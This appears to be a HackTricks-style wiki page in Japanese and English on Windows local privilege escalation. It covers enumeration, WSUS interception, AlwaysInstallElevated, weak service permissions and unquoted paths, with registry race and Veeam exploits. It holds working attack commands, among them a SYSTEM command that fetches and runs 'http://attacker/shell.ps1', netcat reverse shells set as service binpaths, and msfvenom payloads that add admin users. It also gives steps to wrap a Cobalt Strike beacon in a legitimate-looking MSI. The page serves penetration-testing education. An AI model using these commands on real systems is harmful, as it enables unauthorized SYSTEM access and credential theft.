# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すための最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の初期理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が分からない場合は、続行する前に以下のページを読むべきです:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙、実行ファイルの実行、あるいは**あなたの活動の検知**を **妨げる** 可能性のあるさまざまなものがあります。privilege escalation の列挙を始める前に、以下の **ページ** を **読む** べきであり、これらすべての **防御** **機構** を **列挙** してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess process は、AppInfo の secure-path checks を回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[site](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには 4,700 件以上のセキュリティ脆弱性があり、Windows 環境が持つ **massive attack surface** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables に保存されている credential/Juicy info はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) を使用して、これを有効にする方法を学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプライン実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs の最後の15件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行の完全なアクティビティと内容が記録され、実行されるすべてのコードブロックが文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意のある挙動の分析に役立ちます。実行時にすべてのアクティビティを文書化することで、そのプロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

updates が http**S** ではなく http を使って要求されている場合、システムを compromise できます。

まず、cmd で以下を実行して、ネットワークが non-SSL の WSUS update を使っているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell では:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> ローカルユーザーの proxy を変更する権限があり、かつ Windows Updates が Internet Explorer の設定で構成された proxy を使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分の traffic を傍受し、asset 上で elevated user として code を実行できるようになります。
>
> さらに、WSUS service は current user の settings を使用するため、その certificate store も使用します。WSUS hostname 用の self-signed certificate を生成してこの certificate を current user の certificate store に追加すると、HTTP と HTTPS の両方の WSUS traffic を傍受できます。WSUS は certificate に対して trust-on-first-use 型の validation を実装するための HSTS のような mechanism を持っていません。提示された certificate が user に trusted され、正しい hostname を持っていれば、service に受け入れられます。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下で、Windows **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーが domain 内に computer を作成できることが含まれます。重要なのは、これらの**要件**が**デフォルト設定**で満たされるという点です。

**exploit** は [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) にあります。

攻撃の流れの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を参照してください。

## AlwaysInstallElevated

**この** 2 つの register が **有効**（値が **0x1**）であれば、任意の権限のユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
もし meterpreter session があるなら、この technique は module **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使って、現在のディレクトリ内に privilege escalation のための Windows MSI binary を作成します。この script は、user/group の追加を促す事前コンパイル済み MSI installer を書き出します（そのため、GIU access が必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法を学ぶには、このチュートリアルを読んでください。 **command lines** を **just** 実行したいだけなら、**.bat** ファイルをラップできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** します
- **Visual Studio** を開き、**Create a new project** を選んで検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、保存先に **`C:\privesc`** を使い、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- **3 of 4** のステップ（含めるファイルを選択）に進むまで **Next** をクリックし続けます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされたアプリをより正規に見せられる他のプロパティも変更できます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、`beacon.exe` ファイルを選択して **OK** をクリックします。これにより、インストーラーが実行されるとすぐに beacon payload が実行されるようになります。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build it** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームを x64 に設定したことを確認してください。

### MSI Installation

バックグラウンドで悪意のある `.msi` ファイルの **installation** を実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**記録されるか**を決定するので、注意を払う必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるかを知っておくと便利です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は **ローカル Administrator パスワードの管理** のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが **一意で、ランダム化され、定期的に更新** されることを सुनिश्चितします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーだけがアクセスでき、許可されている場合は local admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文のパスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**このページの WDigest についての詳細**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる **メモリの読み取り** やコードの挿入の試みを **ブロック** して、システムをさらに保護しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威からデバイス上に保存された credentials を保護することです。| [**Credentials Guard についての詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### ユーザー & グループの列挙

所属しているグループに、興味深い権限があるか確認すべきです
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もし**特権グループのいずれかに所属しているなら、権限昇格できる可能性があります**。特権グループと、それらを悪用して権限昇格する方法については、こちらで学んでください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token操作

**token** とは何かについては、このページで**さらに学んでください**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
興味深い token と、それらを悪用する方法について**学ぶ**には、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスの一覧を確認し、**プロセスのコマンドライン内にパスワードが含まれていないか確認**してください。\
実行中の **binary を上書きできるか**、または binary フォルダに書き込み権限があるかを確認し、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるか確認してください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に [**electron/cef/chromium debuggers** が実行中か確認してください。それを悪用して権限昇格できる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する（[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは、**認証情報がメモリ内に平文で**存在することがあります。メモリをダンプして、認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックする

## Services

Service Triggers を使うと、特定の条件が発生したときに Windows が service を起動できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、トリガーを発火させることで特権 service を起動できることがよくあります。列挙と起動の手法についてはここを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

service の一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことが推奨されます。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe をここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

もしこのエラーが出る場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次を使って有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 では、サービス upnphost は動作するために SSDPSRV に依存しています**

**この問題の別の回避策** は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスの binary path を変更する**

"Authenticated users" グループがある service に対して **SERVICE_ALL_ACCESS** を持っている場合、その service の executable binary を変更することが可能です。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限はさまざまな権限を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: service binary の再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、service configurations を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: service configurations を変更する能力を継承します。
- **GENERIC_ALL**: こちらも service configurations を変更する能力を継承します。

この脆弱性の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**service によって実行される binary を変更できるか**、または binary が配置されているフォルダに対する**write permissions**を持っているかを確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** を使って service によって実行されるすべての binary を取得し（system32 以外）、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

サービスの registry を変更できるか確認してください。\
service **registry** に対する **permissions** は、次のようにして **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もし持っている場合、サービスによって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、その後 **SYSTEM** プロセスによって HKLM の session key にコピーされます。Registry の **symbolic link race** を使うことで、この特権付き書き込みを **任意の HKLM path** に向け直し、任意の HKLM **value write** の primitive を得られます。

主要な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストール済みの accessibility features を सूचीします。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザーが制御できる configuration を保存します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon / secure-desktop transition の間に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を用意します。
2. secure-desktop copy をトリガーします（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. **race に勝つ**ため、`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定します。oplock が発火したら、**HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選んだ value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが起動できる service（例: **`msiserver`**）を選び、書き込み後にそれをトリガーします。**Note:** 公開されている exploit implementation は、この race の一部として **lock the workstation** を行います。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みのWindowsサービスに属するものを除いて、すべての未引用のサービスパスを列挙します:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検出および悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit を使って手動で service binary を作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は binary を指すように設定できます。この binary を置き換え可能なら、権限昇格が可能かもしれません。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**binaries の権限**（上書きして権限昇格できるかもしれません）と、**folders**（[DLL Hijacking](dll-hijacking/index.html)）の権限を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

特定の config file を読み込めるように変更できるか、または Administrator account によって実行される binary を変更できるかを確認します (schedtasks)。

システム内の弱い folder/file permissions を見つける方法の1つは次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

